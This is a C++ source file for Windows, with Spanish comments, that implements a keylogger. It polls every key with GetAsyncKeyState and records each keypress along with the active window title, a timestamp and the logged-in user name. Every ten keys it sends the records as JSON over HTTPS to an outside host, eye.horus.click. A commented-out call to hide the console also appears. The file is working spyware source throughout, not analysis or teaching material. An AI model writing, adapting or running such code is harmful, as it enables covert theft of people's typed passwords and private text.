#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>
#include<ctime>
#include<lmcons.h>
#include<winhttp.h>
#include<queue>

#pragma comment(lib, "winhttp.lib")

using namespace std;

//Web Service
std::wstring get_utf16(const std::string& str, int codepage) {
	if (str.empty()) return std::wstring();
	int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
	std::wstring res(sz, 0);
	MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
	return res;
}

string HttpsWebRequestPost(string domain, string url, string dat) {
	//Extra
	LPSTR data = const_cast<char*>(dat.c_str());
	DWORD data_len = strlen(data);

	wstring sdomain = get_utf16(domain, CP_UTF8);
	wstring surl = get_utf16(url, CP_UTF8);
	string response;

	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL bResults = FALSE;
	HINTERNET	hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	//Use WinHttpOpen to obtain a session handle
	hSession = WinHttpOpen(L"WinHttp Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	//Specify an HTTP server
	if (hSession)
		hConnect = WinHttpConnect(hSession, sdomain.c_str(),
			INTERNET_DEFAULT_HTTPS_PORT, 0);

	//Create an HTTP request handle.
	if (hConnect)
		hRequest = WinHttpOpenRequest(hConnect, L"PUT", surl.c_str(),
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE);

	//Send a request
	if (hRequest)
		bResults = WinHttpSendRequest(
			hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0,
			(LPVOID)data,
			data_len,
			data_len,
			0);


	//End the request
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	//Keep checking the data until there is nothing left.
	if (bResults) {
		do {
			//Check for available data
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
				printf("Error $u in WinHttpQueryDataAvailable.\n", GetLastError());

			//Allocate space for the buffer
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer) {
				printf("Out of memory\n");
				dwSize = 0;
			}
			else {
				//Read the data
				ZeroMemory(pszOutBuffer, dwSize + 1);

				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					printf("Error %u in WinHttpReadData.\n", GetLastError());
				else
					//printf("%s", pszOutBufffer);
					response = response + string(pszOutBuffer);
				//Free the memory allocated to the buffer
				delete[] pszOutBuffer;
			}
		} while (dwSize > 0);
	}

	//Report any errors
	if (!bResults)
		printf("Error %d ha ocurrido", GetLastError());

	//Close any open handler
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return response;
}

//Variables globales de entorno de ejecución y sus función Entorno() para asignarlas
string window;
string timestamp;
string name;

void Entorno() {
	const int SizeOfTitleBarText = GetWindowTextLength(GetForegroundWindow());
	char* wnd_title = (char*)malloc(SizeOfTitleBarText + 1);
	GetWindowText(GetForegroundWindow(), wnd_title, SizeOfTitleBarText + 1);
	window = wnd_title;
	free(wnd_title);

	std::time_t time = std::time(nullptr);
	timestamp = std::to_string(time);

	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName((TCHAR*)username, &username_len);
	name = username;
}

typedef struct tecla {
	string tiempo;
	string ventana;
	string key;
	string nombre;
} type_key;
type_key str_key;

bool TeclasPulsadas(int tecla) {
	Entorno();
	str_key.ventana = window;
	str_key.tiempo = timestamp;
	str_key.nombre = "" + name + "_" + timestamp;

	switch (tecla) {
	case VK_SPACE:
		// Process the SPACE key.
		str_key.key = "{ESPACIO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_RETURN:
		// Process the ENTER key.
		cout << "\r\n";
		str_key.key = "{INTRO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_SHIFT:
		// Process the SHIFT key.
		str_key.key = "{SHIFT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_BACK:
		// Process the BACK SPACE key.
		str_key.key = "{RETROCESO}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_LEFT:
		// Process the LEFT ARROW key.
		str_key.key = "{LEFT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;
	case VK_RIGHT:
		// Process the RIGHT ARROW key.
		str_key.key = "{RIGHT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_UP:
		// Process the UP ARROW key. 
		str_key.key = "{UP}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_DOWN:
		// Process the DOWN ARROW key. 
		str_key.key = "{DOWN}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_HOME:
		// Process the HOME key. 
		str_key.key = "{HOME}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_END:
		// Process the END key. 
		str_key.key = "{END}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_INSERT:
		// Process the INS key.
		str_key.key = "{INSERT}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_DELETE:
		// Process the DEL key. 
		str_key.key = "{DELETE}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F1:
		// Process the F1 key.
		str_key.key = "{F1}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F2:
		// Process the F2 key.
		str_key.key = "{F2}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F3:
		// Process the F3 key.
		str_key.key = "{F3}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F4:
		// Process the F4 key.
		str_key.key = "{F4}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F5:
		// Process the F5 key.
		str_key.key = "{F5}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F6:
		// Process the F6 key.
		str_key.key = "{F6}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F7:
		// Process the F7 key.
		str_key.key = "{F7}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F8:
		// Process the F8 key.
		str_key.key = "{F8}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F9:
		// Process the F9 key.
		str_key.key = "{F9}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F10:
		// Process the F10 key.
		str_key.key = "{F10}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F11:
		// Process the F11 key.
		str_key.key = "{F11}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	case VK_F12:
		// Process the F12 key.
		str_key.key = "{F12}";
		cout << str_key.key + "\t";
		cout << str_key.ventana + "\t";
		cout << str_key.tiempo + "\t";
		cout << str_key.nombre + "\n";
		return true;
		break;

	default: return false;
	}
}

//Implementación del hilo
DWORD WINAPI Send_to_WS(LPVOID lpParam) {
	
	queue<tecla> *QueueParam = (queue<tecla>*)lpParam;

	for (int i = 10; i > 0; i--) {
		type_key key = QueueParam->front();

		int diferenciador = 0;

		string body = "{"
			"\"Time\":\"" + key.tiempo + "\","
			"\"Window\":\"" + key.ventana + "\","
			"\"Key\":\"" + key.key + "\""
			"}";
		string ruta = "/evento/" + key.nombre + to_string(++diferenciador);
		HttpsWebRequestPost("eye.horus.click", ruta, body);
		//Sleep(100);
		//QueueParam->pop();
	}
	return 1;
}
//--Implementación del hilo--

int main() {
	//FreeConsole();
	unsigned char key;
	queue<tecla> QUEUE;

	//Desplegar Encabezados
	cout << "Tecla\t\t\t";
	cout << "Ventana\t\t\t";
	cout << "Timestamp\t\t\t";
	cout << "Nombre\n";
	cout << "----------------------------------------------------------------------------\n";

	while (TRUE) {
		for (key = 8; key <= 255; key++) {
			if (GetAsyncKeyState(key) == -32767) {
				if (TeclasPulsadas(key) == FALSE) {
					str_key.key = key;

					QUEUE.push(str_key);
					queue<tecla>* cola = &QUEUE;

					//Impresión de depuración
					cout << str_key.key + "\t";
					cout << str_key.ventana + "\t";
					cout << str_key.tiempo + "\t";
					cout << str_key.nombre + "\n";

				}

				//Revisar el contenido de la cola, generar un hilo asíncrono y vaciarla para enviarla al web service
				if (QUEUE.size() >= 10) {
					//Variables para el funcionamiento del proceso
					DWORD dwThreadId;
					HANDLE hThread;

					hThread = CreateThread(
						NULL,
						0,
						Send_to_WS,
						&QUEUE,
						0,
						&dwThreadId
					);

					if (hThread == NULL)
						cout << "Error al crear el proceso";
					else {
						
						DWORD thread_signal = WaitForSingleObject(hThread, 100);
						if((thread_signal != WAIT_FAILED) || (thread_signal != WAIT_TIMEOUT))
							QUEUE.pop();
						
						//WaitForSingleObject(hThread, 0);
						CloseHandle(hThread);
					}
				}

			}
		}
	}
	//free(QUEUE);
}